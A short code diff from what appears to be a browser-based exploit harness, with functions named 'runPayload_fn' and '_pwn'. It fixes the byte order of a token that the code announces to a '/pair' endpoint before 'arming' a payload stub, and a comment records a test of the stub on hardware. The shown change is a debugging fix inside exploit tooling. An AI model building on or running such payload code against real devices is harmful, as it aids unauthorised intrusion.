@@ -1014,7 +1014,12 @@ window.runPayload_fn = async function _pwn() {
     arr[at + 1] = (tok >>> 8) & 0xff;
     arr[at + 2] = (tok >>> 16) & 0xff;
     arr[at + 3] = (tok >>> 24) & 0xff;
-    const hex = ("00000000" + tok.toString(16)).slice(-8);
+    // Announce the bytes exactly as they sit in the blob: the stub load/store
+    // preserves them, so the wire carries arr[at..at+3].  Announcing
+    // tok.toString(16) sent the reverse byte order and every stub was refused
+    // (found on hardware 2026-10-27: announced 347904f1, stub sent f1047934).
+    const hex = [arr[at], arr[at + 1], arr[at + 2], arr[at + 3]]
+      .map(b => ("0" + b.toString(16)).slice(-2)).join("");
     const x = new XMLHttpRequest();
     x.open("POST", "/pair", false);   // synchronous: announce BEFORE arming
     x.send(hex);
